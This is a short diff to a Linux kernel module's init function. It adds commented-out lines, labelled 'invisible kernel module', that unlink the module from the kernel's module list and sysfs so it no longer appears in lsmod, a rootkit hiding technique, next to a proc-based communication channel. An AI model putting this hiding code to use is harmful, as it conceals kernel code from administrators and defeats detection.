@@ -794,6 +794,12 @@ int init(void)
 {
     pr_info("Module loaded\n");
 
+      /*invisble kernel module*/
+    // list_del_init(&__this_module.list);
+    // kobject_del(&THIS_MODULE->mkobj.kobj);
+    // printk("invisible: module loaded\n");
+    /*end invisible lsmod kernel*/
+
     if (!setup_proc_comm_channel())
     {
         pr_info("Failed to set up comm channel\n");
